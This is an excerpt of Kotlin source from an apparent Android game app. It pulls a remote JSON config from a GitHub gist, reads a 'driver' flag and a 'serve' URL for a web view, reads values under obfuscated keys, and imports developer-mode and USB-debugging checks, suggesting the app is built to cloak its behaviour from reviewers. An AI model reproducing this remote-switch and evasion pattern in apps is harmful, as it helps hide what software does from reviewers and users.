...
import com.play.jkr.ggame.util.*
import com.play.jkr.ggame.webView.webViewFragment
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.play.jkr.ggame.game.util.isDevMode
import com.play.jkr.ggame.game.util.isUSB
import com.play.jkr.ggame.util.*
...
class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
    ...
    companion object {
        ...
        const val REMOTE_URL = "https://gist.githubusercontent.com/Clrbt/ec62831ce2a5699e1d95304feb23a0a5/raw/com.play.jkr.ggame"
    }
        ...
        try {
            NetworkUtil.service.getJsonByUrl(REMOTE_URL).body()?.string()?.let { data ->
                JSONObject(data).also { json ->
                    ...
                    val flag = json.getBoolean("driver")
                    webViewURL = json.getString("serve")

                    val bar     = json.getString("bar")
                    val worried = json.getString("worried")
                    val repeat  = json.getString("repeat")
                    val warn    = json.getString("warn")
                    val design  = json.getString("design")
                    val desert  = json.getString("desert")
                    val farther = json.getString("farther")
                    val under   = json.getString("under")
